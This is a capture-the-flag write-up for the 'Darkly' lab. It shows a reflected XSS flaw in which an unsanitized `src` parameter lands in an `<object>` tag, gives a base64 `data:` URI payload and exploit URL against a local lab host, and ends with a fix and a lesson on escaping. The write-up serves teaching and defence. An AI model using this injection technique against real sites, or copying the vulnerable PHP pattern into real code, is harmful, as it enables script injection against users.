
# Media XSS — Darkly

## Vulnerability Type

**Cross-Site Scripting (XSS)** via `data:` URI injection.

---

## Vulnerable Page

The vulnerable endpoint is:

```bash
http://192.168.56.6/index.php?page=media&src=nsa
```

The application reads the `src` parameter directly from the URL and inserts it into an HTML object tag:

```php
<object data="<?= $_GET['src'] ?>"></object>
```

Because the value is not sanitized, an attacker can inject a malicious URI.

---

## Why It Works

Normally the page expects:

```bash
src=nsa
```

But browsers also allow special URIs like:

```bash
data:text/html;base64,...
```

This means we can force the browser to interpret our input as HTML instead of an image.

---

## Payload

JavaScript payload:

```html
<script>alert(1)</script>
```

Base64 encoded:

```bash
PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==

```

---

## Exploit URL

```bash
http://192.168.56.6/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

---

## Result

When opening the URL:

* the browser decodes the base64
* renders it as HTML
* executes JavaScript
* the application returns the flag

---

## Security Issue

The application trusts user input directly:

```php
$_GET['src']
```

Without validation, attackers can inject:

* JavaScript
* HTML
* malicious redirects
* phishing content

---

## Fix

Validate allowed files only:

```php
$src = $_GET['src'];

if (preg_match('/^[a-zA-Z0-9_-]+$/', $src)) {
    echo '<object data="' . $src . '"></object>';
}
```

Better fix:

* use internal image IDs
* never allow raw user-controlled URLs

---

## Key Lesson

Never trust user input inside:

* `src`
* `href`
* `data`
* `location`

without filtering or escaping.

---
